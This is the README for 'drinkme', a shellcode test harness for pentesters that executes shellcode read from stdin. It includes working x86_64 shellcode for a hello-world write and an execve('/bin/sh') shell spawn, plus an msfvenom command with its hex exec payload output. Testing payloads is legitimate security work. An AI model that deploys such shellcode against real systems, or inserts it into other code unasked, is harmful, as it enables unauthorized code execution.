# drinkme

_drinkme_ is a shellcode test harness. It reads shellcode from stdin and executes it. This allows pentesters to quickly test their payloads before deployment.

## Formats ##

_drinkme_ can handle shellcode in the following formats:

* "0x##"
* "\x##"
* "x##"
* "##"

For example, NOP could be represented as any of "0x90", "\x90", "x90", or "90".

When processing the input _drinkme_ will ignore any of the following:

* C and C++ style comments.
* All whitespace.
* Any characters from the set [\\",;].

## Examples ##

**write(STDOUT_FILENO, "Hello world!\n", strlen("Hello world!\n"))**

	empty@monkey:~$ cat hello_world.x86_64 
	\xeb\x1d\x5e\x48\x31\xc0\xb0\x01\x48\x31\xff\x40\xb7\x01\x48\x31\xd2\xb2\x0d\x0f\x05\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xde\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x21\x0a
	
	empty@monkey:~$ cat hello_world.x86_64 | drinkme
	Hello world!


**execve("/bin/sh")**

	empty@monkey:~$ cat execve_bin_sh.x86_64 
	    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
	    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
	    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
	    "\x53"                                          // push   %rbx
	    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
	    "\x50"                                          // push   %rax
	    "\x57"                                          // push   %rdi
	    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
	    "\xb0\x3b"                                      // mov    $0x3b, %al
	    "\x0f\x05";                                     // syscall
	
	empty@monkey:~$ echo $$
	3880
	
	empty@monkey:~$ cat execve_bin_sh.x86_64 | drinkme
	
	$ echo $$
	18613

**msfvenom to exec "/usr/bin/id"**

	root@kali-amd64:~# msfvenom --arch x86_64 --platform linux -f hex -p linux/x64/exec CMD=/usr/bin/id 
	No encoder or badchars specified, outputting raw payload
	Payload size: 51 bytes
	Final size of hex file: 102 bytes
	6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80c0000002f7573722f62696e2f69640056574889e60f05
	
	root@kali-amd64:~# msfvenom --arch x86_64 --platform linux -f hex -p linux/x64/exec CMD=/usr/bin/id | drinkme 
	No encoder or badchars specified, outputting raw payload
	Payload size: 51 bytes
	Final size of hex file: 102 bytes
	
	uid=0(root) gid=0(root) groups=0(root)

	
## Usage ##

	usage:    drinkme [-p] [-h]
	           -p  Print the formatted shellcode. Don't execute it.
	           -h  Print this help message.
	
	Example:  cat hello_world.x86_64 | drinkme
